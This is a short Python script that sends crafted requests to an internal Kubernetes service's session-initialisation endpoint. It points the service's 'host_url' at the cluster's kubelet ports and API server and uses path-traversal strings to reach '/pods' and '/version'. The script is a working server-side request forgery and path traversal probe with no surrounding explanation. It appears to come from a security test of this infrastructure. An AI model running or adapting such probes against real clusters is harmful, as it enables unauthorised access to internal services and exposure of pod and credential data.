import json, urllib.request, urllib.error
base='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'
cases=[('kubelet10250','http://172.20.0.1:10250','../../../../pods'),('kubelet10255','http://172.20.0.1:10255','../../../../pods'),('kubeapih','http://172.20.0.1','../../../../version'),('kubehttps','https://172.20.0.1','../../../../version')]
for n,h,p in cases:
 b=json.dumps({'user_id':'probe-kubelet@armorerlabs.com','host_url':h,'project_path':p,'force':True}).encode()
 q=urllib.request.Request(base,b,method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 try:
  x=urllib.request.urlopen(q,timeout=8); print(n,x.status,x.read(1000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e: print(n,e.code,e.read(1000).decode('utf-8','replace'))
 except Exception as e: print(n,repr(e))
